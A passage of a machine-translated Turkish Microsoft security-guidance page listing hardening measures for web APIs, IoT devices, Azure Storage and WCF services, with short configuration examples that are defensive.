EnableCors özniteliğindeki kaynak listesinin sınırlı ve güvenilir bir menşe kümesine ayarlandığından emin olmak için önemli olduğunu lütfen unutmayın. Bunu uygunsuz bir şekilde yapılandırılamaması (örneğin, değeri '*' olarak ayarlamak), kötü amaçlı sitelerin herhangi bir kısıtlama olmaksızın API'ye çapraz kaynak isteklerini tetiklemesine >böylece API'yi CSRF saldırılarına karşı savunmasız hale getirir. 

### <a name="example"></a>Örnek
Bir denetleyici veya eylem için CORS'u devre dışı kullanabilirsiniz, [Devre Dışı Korenler] özniteliğini kullanın. 
```csharp
[DisableCors]
    public IActionResult About()
    {
        return View();
    }
```

## <a name="encrypt-sections-of-web-apis-configuration-files-that-contain-sensitive-data"></a><a id="config-sensitive"></a>Web API'nin yapılandırma dosyalarının hassas veriler içeren bölümlerini şifreleme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Web API | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [Nasıl İşlenir: ASP.NET 2.0'da Yapılandırma Bölümlerini DPAPI Kullanarak Şifreleme](https://msdn.microsoft.com/library/ff647398.aspx), [Korumalı Yapılandırma Sağlayıcısı Belirtme](https://msdn.microsoft.com/library/68ze1hb2.aspx), Uygulama sırlarını korumak için Azure Key [Vault'u Kullanma](https://azure.microsoft.com/documentation/articles/guidance-multitenant-identity-keyvault/) |
| **Adımlar** | Web.config, appsettings.json gibi yapılandırma dosyaları genellikle kullanıcı adları, parolalar, veritabanı bağlantı dizeleri ve şifreleme anahtarları gibi hassas bilgileri tutmak için kullanılır. Bu bilgileri korumazsanız, uygulamanız saldırganlara veya hesap kullanıcı adları ve parolalar, veritabanı adları ve sunucu adları gibi hassas bilgileri alan kötü niyetli kullanıcılara karşı savunmasızdır. Dağıtım türüne (azure/on-prem) bağlı olarak, DPAPI veya Azure Key Vault gibi hizmetleri kullanarak config dosyalarının hassas bölümlerini şifreleyin. |

## <a name="ensure-that-all-admin-interfaces-are-secured-with-strong-credentials"></a><a id="admin-strong"></a>Tüm yönetici arabirimlerinin güçlü kimlik bilgileriyle güvenli olduğundan emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | Aygıtın veya alan ağ geçidinin ortaya çıkardığı tüm yönetim arabirimleri güçlü kimlik bilgileri kullanılarak güvenli olmalıdır. Ayrıca, WiFi, SSH, Dosya paylaşımları, FTP gibi diğer maruz arayüzler güçlü kimlik bilgileri ile güvenli olmalıdır. Varsayılan zayıf parolalar kullanılmamalıdır. |

## <a name="ensure-that-unknown-code-cannot-execute-on-devices"></a><a id="unknown-exe"></a>Bilinmeyen kodun aygıtlarda yürütülmediğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [Windows 10 IoT Core'da Güvenli Önyükleme ve bit-locker Aygıt Şifrelemesini etkinleştirme](https://docs.microsoft.com/windows/iot-core/secure-your-device/securebootandbitlocker) |
| **Adımlar** | UEFI Secure Boot, sistemi yalnızca belirli bir makam tarafından imzalanmış ikili lerin yürütülmesine izin vermek için kısıtlar. Bu özellik, bilinmeyen kodun platformda yürütülmesini önler ve kodun güvenlik duruşunu zayıflatma potansiyeline sahiptir. UEFI Güvenli Önyükleme'yi etkinleştirin ve kod imzalaması için güvenilen sertifika yetkilileri listesini kısıtlayın. Güvenilir yetkililerden birini kullanarak aygıtta dağıtılan tüm kodları imzalayın. |

## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>IoT Cihazının işletim sistemi ve ek bölümlerini bit dolabı ile şifreleme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri gerçekleştiren UEFI'de gerekli preOS protokolü de dahil olmak üzere platformda bir TPM varlığına güçlü bir bağımlılığa sahip bit dolabı Aygıt Şifrelemesinin hafif bir sürümünü uygular. Bu preOS ölçümleri, işletim sistemi daha sonra işletim sistemi başlatıldı nasıl kesin bir kayıt olmasını sağlar. Bit dolabı nı ve herhangi bir ek bölümü kullanarak işletim sistemi bölümlerini şifreleyin, ayrıca hassas verileri depolamaları durumunda. |

## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>Cihazlarda yalnızca minimum hizmetlerin/özelliklerin etkin olduğundan emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Cihazı | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | İşletim sistemi içinde çözümün çalışması için gerekli olmayan özellikleri veya hizmetleri etkinleştirmeyin veya kapatmayın. Örneğin, aygıtın bir UI'nin dağıtılmasını gerektirmediği için, Windows IoT Core'u başsız modda yükleyin. |

## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>IoT Field Gateway'in işletim sistemi ve ek bölümlerini bit dolabı yla şifreleme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Alan Ağ Geçidi | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | Windows 10 IoT Core, gerekli ölçümleri gerçekleştiren UEFI'de gerekli preOS protokolü de dahil olmak üzere platformda bir TPM varlığına güçlü bir bağımlılığa sahip bit dolabı Aygıt Şifrelemesinin hafif bir sürümünü uygular. Bu preOS ölçümleri, işletim sistemi daha sonra işletim sistemi başlatıldı nasıl kesin bir kayıt olmasını sağlar. Bit dolabı nı ve herhangi bir ek bölümü kullanarak işletim sistemi bölümlerini şifreleyin, ayrıca hassas verileri depolamaları durumunda. |

## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>Yükleme sırasında alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin değiştirildiğinden emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Alan Ağ Geçidi | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | Yükleme sırasında alan ağ geçidinin varsayılan oturum açma kimlik bilgilerinin değiştirildiğinden emin olun |

## <a name="ensure-that-the-cloud-gateway-implements-a-process-to-keep-the-connected-devices-firmware-up-to-date"></a><a id="cloud-firmware"></a>Bulut Ağ Geçidi'nin bağlı aygıtları güncel tutmak için bir işlem uyguladığından emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | IoT Bulut Ağ Geçidi | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Ağ geçidi seçimi - Azure IoT Hub |
| **Başvurular**              | [IoT Hub Cihaz Yönetimi Genel Bakış](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), Aygıt [Firmware nasıl güncellenir](../../iot-hub/tutorial-firmware-update.md) |
| **Adımlar** | LWM2M, Open Mobile Alliance for IoT Cihaz Yönetimi için bir protokoldür. Azure IoT aygıt yönetimi, aygıt işlerini kullanarak fiziksel aygıtlarla etkileşime girmenize olanak tanır. Azure IoT Hub Aygıt Yönetimi'ni kullanarak Bulut Ağ Geçidi'nin aygıtı ve diğer yapılandırma verilerini düzenli olarak güncel tutmak için bir işlem uyguladığından emin olun. |

## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>Aygıtların kuruluş ilkelerine göre yapılandırılan son nokta güvenlik denetimlerine sahip olduğundan emin olun

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Makine Güven Sınırı | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | Yok  |
| **Adımlar** | Aygıtların disk düzeyinde şifreleme için bit dolabı, güncelleştirilmiş imzalara sahip virüsten koruma, ana bilgisayar tabanlı güvenlik duvarı, işletim sistemi yükseltmeleri, grup ilkeleri vb. gibi son nokta güvenlik denetimlerine sahip olduğundan emin olun, kuruluş güvenlik ilkelerine göre yapılandırılır. |

## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Azure depolama erişim anahtarlarının güvenli yönetimini sağlayın

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Azure Storage | 
| **SDL Fazı**               | Dağıtım |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [Azure Depolama güvenlik kılavuzu - Depolama Hesabı Anahtarlarınızı Yönetme](https://azure.microsoft.com/documentation/articles/storage-security-guide/#_managing-your-storage-account-keys) |
| **Adımlar** | <p>Anahtar Depolama: Azure Depolama erişim anahtarlarını Azure Anahtar Kasası'nda gizli olarak saklamanız ve uygulamaların anahtarı anahtar kasasından alması önerilir. Bu, aşağıdaki nedenlerden dolayı önerilir:</p><ul><li>Uygulama, belirli bir izin olmadan anahtarlara erişen birinin bu bulvarını kaldıran bir yapılandırma dosyasında depolama anahtarının kodlanmasına asla gerek duymaz.</li><li>Anahtarlara erişim Azure Active Directory kullanılarak denetlenebilir. Bu, bir hesap sahibinin Anahtarları Azure Anahtar Kasasından alması gereken bir avuç uygulamaya erişim izni verebileceği anlamına gelir. Diğer uygulamalar, özellikle izin vermeden anahtarlara erişemez.</li><li>Anahtar Yenileme: Güvenlik nedenleriyle Azure depolama erişim anahtarlarını yeniden oluşturmak için bir işlemin olması önerilir. Önemli rejenerasyon un neden ve nasıl planlanacak ile ilgili ayrıntıları Azure Depolama Güvenliği Kılavuzu başvuru makalesinde belgelenmiştir</li></ul>|

## <a name="ensure-that-only-trusted-origins-are-allowed-if-cors-is-enabled-on-azure-storage"></a><a id="cors-storage"></a>Azure depolama da CORS etkinse yalnızca güvenilen kökenlere izin verildiğini sağlayın

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | Azure Storage | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | Genel |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [Azure Depolama Hizmetleri için CORS Desteği](https://msdn.microsoft.com/library/azure/dn535601.aspx) |
| **Adımlar** | Azure Depolama, CORS – Çapraz Kaynak Paylaşımı'nı etkinleştirmenizi sağlar. Her depolama hesabı için, bu depolama hesabındaki kaynaklara erişebilecek etki alanlarını belirtebilirsiniz. Varsayılan olarak, CORS tüm hizmetlerde devre dışı bırakılır. Hizmet ilkelerini ayarlamak için yöntemlerden birini çağırmak için REST API veya depolama istemcikitaplığını kullanarak CORS'leri etkinleştirebilirsiniz. |

## <a name="enable-wcfs-service-throttling-feature"></a><a id="throttling"></a>WCF'nin hizmet azaltma özelliğini etkinleştirme

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | WCF | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | .NET Çerçeve 3 |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Türkiye](https://vulncat.fortify.com) |
| **Adımlar** | <p>Sistem kaynaklarının kullanımına bir sınır koymamak kaynak tükenmesi ve nihayetinde hizmet reddi ile sonuçlanabilir.</p><ul><li>**AÇIKLAMA:** Windows Communication Foundation (WCF), hizmet isteklerini azaltma olanağı sunar. Çok fazla istemci isteğine izin vermek, bir sistemi su basabilir ve kaynaklarını tüketebilir. Diğer taraftan, bir hizmete yalnızca az sayıda istek isteğine izin vermek, yasal kullanıcıların hizmeti kullanmasını engelleyebilir. Her hizmet, uygun miktarda kaynağa izin verecek şekilde ayrı ayrı ayarlanmalıdır ve yapılandırılmalıdır.</li><li>**ÖNERİLER** WCF'nin hizmet azaltma özelliğini etkinleştirin ve uygulamanız için uygun sınırlar belirleyin.</li></ul>|

### <a name="example"></a>Örnek
Aşağıda, azaltma etkinleştirilmiş örnek bir yapılandırma verilmiştir:
```
<system.serviceModel> 
  <behaviors>
    <serviceBehaviors>
    <behavior name="Throttled">
    <serviceThrottling maxConcurrentCalls="[YOUR SERVICE VALUE]" maxConcurrentSessions="[YOUR SERVICE VALUE]" maxConcurrentInstances="[YOUR SERVICE VALUE]" /> 
  ...
</system.serviceModel> 
```

## <a name="wcf-information-disclosure-through-metadata"></a><a id="info-metadata"></a>Meta veriler aracılığıyla WCF-Bilgi açıklaması

| Başlık                   | Ayrıntılar      |
| ----------------------- | ------------ |
| **Bileşen**               | WCF | 
| **SDL Fazı**               | Oluşturma |  
| **Uygulanabilir Teknolojiler** | .NET Çerçeve 3 |
| **Öznitelikler**              | Yok  |
| **Başvurular**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Türkiye](https://vulncat.fortify.com) |
| **Adımlar** | Meta veriler, saldırganların sistem hakkında bilgi edinmelerine ve bir saldırı biçimi planlamalarına yardımcı olabilir. WCF hizmetleri meta verileri ortaya çıkarmak için yapılandırılabilir. Meta veriler ayrıntılı hizmet tanımı bilgileri verir ve üretim ortamlarında yayınlanmamalıdır. ServiceMetaData sınıfının özellikleri, `HttpGetEnabled`  /  `HttpsGetEnabled` bir hizmetin meta verileri ortaya çıkarıp göstermeyeceğini tanımlar | 

### <a name="example"></a>Örnek
Aşağıdaki kod, WCF'ye bir hizmetin meta verilerini yayınlamasını emreder
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior();
smb.HttpGetEnabled = true; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb); 
```
Hizmet meta verilerini üretim ortamında yayınlamayın. ServiceMetaData sınıfının HttpGetEnabled / HttpsGetEnabled özelliklerini yanlış olarak ayarlayın. 

### <a name="example"></a>Örnek
Aşağıdaki kod, WCF'ye bir hizmetin meta verilerini yayınlamamasını bildirir. 
```
ServiceMetadataBehavior smb = new ServiceMetadataBehavior(); 
smb.HttpGetEnabled = false; 
smb.HttpGetUrl = new Uri(EndPointAddress); 
Host.Description.Behaviors.Add(smb);
```
